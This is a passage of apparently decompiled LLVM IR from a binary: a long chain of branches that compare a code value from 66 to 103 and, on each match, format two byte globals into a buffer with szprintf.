  %v8_b554 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d5f8.200 to i32), i32 %v4_b554, i32 %v6_b554, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b558

dec_label_pc_b558:                                ; preds = %dec_label_pc_b524, %dec_label_pc_b530
  %v7_b55c = icmp eq i32 %v2_a7e4, 66
  br i1 %v7_b55c, label %dec_label_pc_b564, label %dec_label_pc_b58c

dec_label_pc_b564:                                ; preds = %dec_label_pc_b558
  %v3_b570 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b57c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b588 = sext i8 %v3_b570 to i32
  %v6_b588 = sext i8 %v3_b57c to i32
  %v8_b588 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d608.202 to i32), i32 %v4_b588, i32 %v6_b588, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b58c

dec_label_pc_b58c:                                ; preds = %dec_label_pc_b558, %dec_label_pc_b564
  %v7_b590 = icmp eq i32 %v2_a7e4, 67
  br i1 %v7_b590, label %dec_label_pc_b598, label %dec_label_pc_b5c0

dec_label_pc_b598:                                ; preds = %dec_label_pc_b58c
  %v3_b5a4 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b5b0 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b5bc = sext i8 %v3_b5a4 to i32
  %v6_b5bc = sext i8 %v3_b5b0 to i32
  %v8_b5bc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d618.204 to i32), i32 %v4_b5bc, i32 %v6_b5bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b58c, %dec_label_pc_b598
  %v7_b5c4 = icmp eq i32 %v2_a7e4, 68
  br i1 %v7_b5c4, label %dec_label_pc_b5cc, label %dec_label_pc_b5f4

dec_label_pc_b5cc:                                ; preds = %dec_label_pc_b5c0
  %v3_b5d8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b5e4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b5f0 = sext i8 %v3_b5d8 to i32
  %v6_b5f0 = sext i8 %v3_b5e4 to i32
  %v8_b5f0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d628.206 to i32), i32 %v4_b5f0, i32 %v6_b5f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5f4

dec_label_pc_b5f4:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b5cc
  %v7_b5f8 = icmp eq i32 %v2_a7e4, 69
  br i1 %v7_b5f8, label %dec_label_pc_b600, label %dec_label_pc_b628

dec_label_pc_b600:                                ; preds = %dec_label_pc_b5f4
  %v3_b60c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b618 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b624 = sext i8 %v3_b60c to i32
  %v6_b624 = sext i8 %v3_b618 to i32
  %v8_b624 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d638.208 to i32), i32 %v4_b624, i32 %v6_b624, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b628

dec_label_pc_b628:                                ; preds = %dec_label_pc_b5f4, %dec_label_pc_b600
  %v7_b62c = icmp eq i32 %v2_a7e4, 70
  br i1 %v7_b62c, label %dec_label_pc_b634, label %dec_label_pc_b65c

dec_label_pc_b634:                                ; preds = %dec_label_pc_b628
  %v3_b640 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b64c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b658 = sext i8 %v3_b640 to i32
  %v6_b658 = sext i8 %v3_b64c to i32
  %v8_b658 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d648.210 to i32), i32 %v4_b658, i32 %v6_b658, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b65c

dec_label_pc_b65c:                                ; preds = %dec_label_pc_b628, %dec_label_pc_b634
  %v7_b660 = icmp eq i32 %v2_a7e4, 71
  br i1 %v7_b660, label %dec_label_pc_b668, label %dec_label_pc_b690

dec_label_pc_b668:                                ; preds = %dec_label_pc_b65c
  %v3_b674 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b680 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b68c = sext i8 %v3_b674 to i32
  %v6_b68c = sext i8 %v3_b680 to i32
  %v8_b68c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d658.212 to i32), i32 %v4_b68c, i32 %v6_b68c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b690

dec_label_pc_b690:                                ; preds = %dec_label_pc_b65c, %dec_label_pc_b668
  %v7_b694 = icmp eq i32 %v2_a7e4, 72
  br i1 %v7_b694, label %dec_label_pc_b69c, label %dec_label_pc_b6c4

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b690
  %v3_b6a8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b6b4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b6c0 = sext i8 %v3_b6a8 to i32
  %v6_b6c0 = sext i8 %v3_b6b4 to i32
  %v8_b6c0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d668.214 to i32), i32 %v4_b6c0, i32 %v6_b6c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6c4

dec_label_pc_b6c4:                                ; preds = %dec_label_pc_b690, %dec_label_pc_b69c
  %v7_b6c8 = icmp eq i32 %v2_a7e4, 73
  br i1 %v7_b6c8, label %dec_label_pc_b6d0, label %dec_label_pc_b948

dec_label_pc_b6d0:                                ; preds = %dec_label_pc_b6c4
  %v3_b6dc = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b6e8 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b944 = sext i8 %v3_b6dc to i32
  %v6_b944 = sext i8 %v3_b6e8 to i32
  %v8_b944 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d678.216 to i32), i32 %v4_b944, i32 %v6_b944, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b948

dec_label_pc_b948:                                ; preds = %dec_label_pc_b6c4, %dec_label_pc_b6d0
  %v7_b94c = icmp eq i32 %v2_a7e4, 74
  br i1 %v7_b94c, label %dec_label_pc_b954, label %dec_label_pc_b97c

dec_label_pc_b954:                                ; preds = %dec_label_pc_b948
  %v3_b960 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b96c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b978 = sext i8 %v3_b960 to i32
  %v6_b978 = sext i8 %v3_b96c to i32
  %v8_b978 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d688.218 to i32), i32 %v4_b978, i32 %v6_b978, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b97c

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b948, %dec_label_pc_b954
  %v7_b980 = icmp eq i32 %v2_a7e4, 75
  br i1 %v7_b980, label %dec_label_pc_b988, label %dec_label_pc_b9b0

dec_label_pc_b988:                                ; preds = %dec_label_pc_b97c
  %v3_b994 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b9a0 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b9ac = sext i8 %v3_b994 to i32
  %v6_b9ac = sext i8 %v3_b9a0 to i32
  %v8_b9ac = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d698.221 to i32), i32 %v4_b9ac, i32 %v6_b9ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b97c, %dec_label_pc_b988
  %v7_b9b4 = icmp eq i32 %v2_a7e4, 76
  br i1 %v7_b9b4, label %dec_label_pc_b9bc, label %dec_label_pc_b9e4

dec_label_pc_b9bc:                                ; preds = %dec_label_pc_b9b0
  %v3_b9c8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_b9d4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_b9e0 = sext i8 %v3_b9c8 to i32
  %v6_b9e0 = sext i8 %v3_b9d4 to i32
  %v8_b9e0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d6a8.223 to i32), i32 %v4_b9e0, i32 %v6_b9e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9e4

dec_label_pc_b9e4:                                ; preds = %dec_label_pc_b9b0, %dec_label_pc_b9bc
  %v7_b9e8 = icmp eq i32 %v2_a7e4, 77
  br i1 %v7_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_ba18

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9e4
  %v3_b9fc = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ba08 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ba14 = sext i8 %v3_b9fc to i32
  %v6_ba14 = sext i8 %v3_ba08 to i32
  %v8_ba14 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d6b8.225 to i32), i32 %v4_ba14, i32 %v6_ba14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9e4, %dec_label_pc_b9f0
  %v7_ba1c = icmp eq i32 %v2_a7e4, 78
  br i1 %v7_ba1c, label %dec_label_pc_ba24, label %dec_label_pc_ba4c

dec_label_pc_ba24:                                ; preds = %dec_label_pc_ba18
  %v3_ba30 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ba3c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ba48 = sext i8 %v3_ba30 to i32
  %v6_ba48 = sext i8 %v3_ba3c to i32
  %v8_ba48 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d6c8.227 to i32), i32 %v4_ba48, i32 %v6_ba48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba18, %dec_label_pc_ba24
  %v7_ba50 = icmp eq i32 %v2_a7e4, 79
  br i1 %v7_ba50, label %dec_label_pc_ba58, label %dec_label_pc_ba80

dec_label_pc_ba58:                                ; preds = %dec_label_pc_ba4c
  %v3_ba64 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_ba70 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_ba7c = sext i8 %v3_ba64 to i32
  %v6_ba7c = sext i8 %v3_ba70 to i32
  %v8_ba7c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d6d8.229 to i32), i32 %v4_ba7c, i32 %v6_ba7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba80

dec_label_pc_ba80:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_ba58
  %v7_ba84 = icmp eq i32 %v2_a7e4, 80
  br i1 %v7_ba84, label %dec_label_pc_ba8c, label %dec_label_pc_bab4

dec_label_pc_ba8c:                                ; preds = %dec_label_pc_ba80
  %v3_ba98 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_baa4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bab0 = sext i8 %v3_ba98 to i32
  %v6_bab0 = sext i8 %v3_baa4 to i32
  %v8_bab0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d6e8.231 to i32), i32 %v4_bab0, i32 %v6_bab0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bab4

dec_label_pc_bab4:                                ; preds = %dec_label_pc_ba80, %dec_label_pc_ba8c
  %v7_bab8 = icmp eq i32 %v2_a7e4, 81
  br i1 %v7_bab8, label %dec_label_pc_bac0, label %dec_label_pc_bae8

dec_label_pc_bac0:                                ; preds = %dec_label_pc_bab4
  %v3_bacc = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bad8 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bae4 = sext i8 %v3_bacc to i32
  %v6_bae4 = sext i8 %v3_bad8 to i32
  %v8_bae4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d6f8.233 to i32), i32 %v4_bae4, i32 %v6_bae4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %dec_label_pc_bab4, %dec_label_pc_bac0
  %v7_baec = icmp eq i32 %v2_a7e4, 82
  br i1 %v7_baec, label %dec_label_pc_baf4, label %dec_label_pc_bb1c

dec_label_pc_baf4:                                ; preds = %dec_label_pc_bae8
  %v3_bb00 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bb0c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bb18 = sext i8 %v3_bb00 to i32
  %v6_bb18 = sext i8 %v3_bb0c to i32
  %v8_bb18 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d708.235 to i32), i32 %v4_bb18, i32 %v6_bb18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb1c

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bae8, %dec_label_pc_baf4
  %v7_bb20 = icmp eq i32 %v2_a7e4, 83
  br i1 %v7_bb20, label %dec_label_pc_bb28, label %dec_label_pc_bb50

dec_label_pc_bb28:                                ; preds = %dec_label_pc_bb1c
  %v3_bb34 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bb40 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bb4c = sext i8 %v3_bb34 to i32
  %v6_bb4c = sext i8 %v3_bb40 to i32
  %v8_bb4c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d718.237 to i32), i32 %v4_bb4c, i32 %v6_bb4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb50

dec_label_pc_bb50:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb28
  %v7_bb54 = icmp eq i32 %v2_a7e4, 84
  br i1 %v7_bb54, label %dec_label_pc_bb5c, label %dec_label_pc_bb84

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_bb50
  %v3_bb68 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bb74 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bb80 = sext i8 %v3_bb68 to i32
  %v6_bb80 = sext i8 %v3_bb74 to i32
  %v8_bb80 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d728.239 to i32), i32 %v4_bb80, i32 %v6_bb80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb84

dec_label_pc_bb84:                                ; preds = %dec_label_pc_bb50, %dec_label_pc_bb5c
  %v7_bb88 = icmp eq i32 %v2_a7e4, 85
  br i1 %v7_bb88, label %dec_label_pc_bb90, label %dec_label_pc_bbb8

dec_label_pc_bb90:                                ; preds = %dec_label_pc_bb84
  %v3_bb9c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bba8 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bbb4 = sext i8 %v3_bb9c to i32
  %v6_bbb4 = sext i8 %v3_bba8 to i32
  %v8_bbb4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d738.241 to i32), i32 %v4_bbb4, i32 %v6_bbb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bb84, %dec_label_pc_bb90
  %v7_bbbc = icmp eq i32 %v2_a7e4, 86
  br i1 %v7_bbbc, label %dec_label_pc_bbc4, label %dec_label_pc_bbec

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bbb8
  %v3_bbd0 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bbdc = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bbe8 = sext i8 %v3_bbd0 to i32
  %v6_bbe8 = sext i8 %v3_bbdc to i32
  %v8_bbe8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d748.243 to i32), i32 %v4_bbe8, i32 %v6_bbe8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbec

dec_label_pc_bbec:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_bbc4
  %v7_bbf0 = icmp eq i32 %v2_a7e4, 87
  br i1 %v7_bbf0, label %dec_label_pc_bbf8, label %dec_label_pc_bc20

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bbec
  %v3_bc04 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bc10 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bc1c = sext i8 %v3_bc04 to i32
  %v6_bc1c = sext i8 %v3_bc10 to i32
  %v8_bc1c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d758.245 to i32), i32 %v4_bc1c, i32 %v6_bc1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bbec, %dec_label_pc_bbf8
  %v7_bc24 = icmp eq i32 %v2_a7e4, 88
  br i1 %v7_bc24, label %dec_label_pc_bc2c, label %dec_label_pc_bc54

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_bc20
  %v3_bc38 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bc44 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bc50 = sext i8 %v3_bc38 to i32
  %v6_bc50 = sext i8 %v3_bc44 to i32
  %v8_bc50 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d768.247 to i32), i32 %v4_bc50, i32 %v6_bc50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc54

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc20, %dec_label_pc_bc2c
  %v7_bc58 = icmp eq i32 %v2_a7e4, 89
  br i1 %v7_bc58, label %dec_label_pc_bc60, label %dec_label_pc_bc88

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bc54
  %v3_bc6c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bc78 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bc84 = sext i8 %v3_bc6c to i32
  %v6_bc84 = sext i8 %v3_bc78 to i32
  %v8_bc84 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d778.249 to i32), i32 %v4_bc84, i32 %v6_bc84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc88

dec_label_pc_bc88:                                ; preds = %dec_label_pc_bc54, %dec_label_pc_bc60
  %v7_bc8c = icmp eq i32 %v2_a7e4, 90
  br i1 %v7_bc8c, label %dec_label_pc_bc94, label %dec_label_pc_bcbc

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc88
  %v3_bca0 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bcac = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bcb8 = sext i8 %v3_bca0 to i32
  %v6_bcb8 = sext i8 %v3_bcac to i32
  %v8_bcb8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d788.251 to i32), i32 %v4_bcb8, i32 %v6_bcb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcbc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bc88, %dec_label_pc_bc94
  %v7_bcc0 = icmp eq i32 %v2_a7e4, 91
  br i1 %v7_bcc0, label %dec_label_pc_bcc8, label %dec_label_pc_bcf0

dec_label_pc_bcc8:                                ; preds = %dec_label_pc_bcbc
  %v3_bcd4 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bce0 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bcec = sext i8 %v3_bcd4 to i32
  %v6_bcec = sext i8 %v3_bce0 to i32
  %v8_bcec = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d798.253 to i32), i32 %v4_bcec, i32 %v6_bcec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcf0

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcbc, %dec_label_pc_bcc8
  %v7_bcf4 = icmp eq i32 %v2_a7e4, 92
  br i1 %v7_bcf4, label %dec_label_pc_bcfc, label %dec_label_pc_bd24

dec_label_pc_bcfc:                                ; preds = %dec_label_pc_bcf0
  %v3_bd08 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bd14 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bd20 = sext i8 %v3_bd08 to i32
  %v6_bd20 = sext i8 %v3_bd14 to i32
  %v8_bd20 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d7a8.255 to i32), i32 %v4_bd20, i32 %v6_bd20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd24

dec_label_pc_bd24:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bcfc
  %v7_bd28 = icmp eq i32 %v2_a7e4, 93
  br i1 %v7_bd28, label %dec_label_pc_bd30, label %dec_label_pc_bd58

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd24
  %v3_bd3c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bd48 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bd54 = sext i8 %v3_bd3c to i32
  %v6_bd54 = sext i8 %v3_bd48 to i32
  %v8_bd54 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d7b8.257 to i32), i32 %v4_bd54, i32 %v6_bd54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd58

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd24, %dec_label_pc_bd30
  %v7_bd5c = icmp eq i32 %v2_a7e4, 94
  br i1 %v7_bd5c, label %dec_label_pc_bd64, label %dec_label_pc_bd8c

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd58
  %v3_bd70 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bd7c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bd88 = sext i8 %v3_bd70 to i32
  %v6_bd88 = sext i8 %v3_bd7c to i32
  %v8_bd88 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d498.156 to i32), i32 %v4_bd88, i32 %v6_bd88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd8c

dec_label_pc_bd8c:                                ; preds = %dec_label_pc_bd58, %dec_label_pc_bd64
  %v7_bd90 = icmp eq i32 %v2_a7e4, 95
  br i1 %v7_bd90, label %dec_label_pc_bd98, label %dec_label_pc_bdc0

dec_label_pc_bd98:                                ; preds = %dec_label_pc_bd8c
  %v3_bda4 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bdb0 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bdbc = sext i8 %v3_bda4 to i32
  %v6_bdbc = sext i8 %v3_bdb0 to i32
  %v8_bdbc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d7c8.259 to i32), i32 %v4_bdbc, i32 %v6_bdbc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdc0

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd8c, %dec_label_pc_bd98
  %v7_bdc4 = icmp eq i32 %v2_a7e4, 96
  br i1 %v7_bdc4, label %dec_label_pc_bdcc, label %dec_label_pc_bdf4

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bdc0
  %v3_bdd8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bde4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bdf0 = sext i8 %v3_bdd8 to i32
  %v6_bdf0 = sext i8 %v3_bde4 to i32
  %v8_bdf0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d4c8.162 to i32), i32 %v4_bdf0, i32 %v6_bdf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdf4

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bdc0, %dec_label_pc_bdcc
  %v7_bdf8 = icmp eq i32 %v2_a7e4, 97
  br i1 %v7_bdf8, label %dec_label_pc_be00, label %dec_label_pc_be28

dec_label_pc_be00:                                ; preds = %dec_label_pc_bdf4
  %v3_be0c = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_be18 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_be24 = sext i8 %v3_be0c to i32
  %v6_be24 = sext i8 %v3_be18 to i32
  %v8_be24 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d7d8.261 to i32), i32 %v4_be24, i32 %v6_be24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be28

dec_label_pc_be28:                                ; preds = %dec_label_pc_bdf4, %dec_label_pc_be00
  %v7_be2c = icmp eq i32 %v2_a7e4, 98
  br i1 %v7_be2c, label %dec_label_pc_be34, label %dec_label_pc_be5c

dec_label_pc_be34:                                ; preds = %dec_label_pc_be28
  %v3_be40 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_be4c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_be58 = sext i8 %v3_be40 to i32
  %v6_be58 = sext i8 %v3_be4c to i32
  %v8_be58 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d7e8.263 to i32), i32 %v4_be58, i32 %v6_be58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be5c

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be28, %dec_label_pc_be34
  %v7_be60 = icmp eq i32 %v2_a7e4, 99
  br i1 %v7_be60, label %dec_label_pc_be68, label %dec_label_pc_be90

dec_label_pc_be68:                                ; preds = %dec_label_pc_be5c
  %v3_be74 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_be80 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_be8c = sext i8 %v3_be74 to i32
  %v6_be8c = sext i8 %v3_be80 to i32
  %v8_be8c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d7f8.265 to i32), i32 %v4_be8c, i32 %v6_be8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be90

dec_label_pc_be90:                                ; preds = %dec_label_pc_be5c, %dec_label_pc_be68
  %v7_be94 = icmp eq i32 %v2_a7e4, 100
  br i1 %v7_be94, label %dec_label_pc_be9c, label %dec_label_pc_bec4

dec_label_pc_be9c:                                ; preds = %dec_label_pc_be90
  %v3_bea8 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_beb4 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bec0 = sext i8 %v3_bea8 to i32
  %v6_bec0 = sext i8 %v3_beb4 to i32
  %v8_bec0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d808.267 to i32), i32 %v4_bec0, i32 %v6_bec0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bec4

dec_label_pc_bec4:                                ; preds = %dec_label_pc_be90, %dec_label_pc_be9c
  %v7_bec8 = icmp eq i32 %v2_a7e4, 101
  br i1 %v7_bec8, label %dec_label_pc_bed0, label %dec_label_pc_bef8

dec_label_pc_bed0:                                ; preds = %dec_label_pc_bec4
  %v3_bedc = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bee8 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bef4 = sext i8 %v3_bedc to i32
  %v6_bef4 = sext i8 %v3_bee8 to i32
  %v8_bef4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1d818.269 to i32), i32 %v4_bef4, i32 %v6_bef4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bef8

dec_label_pc_bef8:                                ; preds = %dec_label_pc_bec4, %dec_label_pc_bed0
  %v7_befc = icmp eq i32 %v2_a7e4, 102
  br i1 %v7_befc, label %dec_label_pc_bf04, label %dec_label_pc_bf2c

dec_label_pc_bf04:                                ; preds = %dec_label_pc_bef8
  %v3_bf10 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bf1c = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bf28 = sext i8 %v3_bf10 to i32
  %v6_bf28 = sext i8 %v3_bf1c to i32
  %v8_bf28 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1d828.271 to i32), i32 %v4_bf28, i32 %v6_bf28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_bef8, %dec_label_pc_bf04
  %v7_bf30 = icmp eq i32 %v2_a7e4, 103
  br i1 %v7_bf30, label %dec_label_pc_bf38, label %dec_label_pc_bf60

dec_label_pc_bf38:                                ; preds = %dec_label_pc_bf2c
  %v3_bf44 = load i8, i8* @global_var_2b5e5.71, align 1
  %v3_bf50 = load i8, i8* @global_var_2b5e6.72, align 1
  %v4_bf5c = sext i8 %v3_bf44 to i32
  %v6_bf5c = sext i8 %v3_bf50 to i32
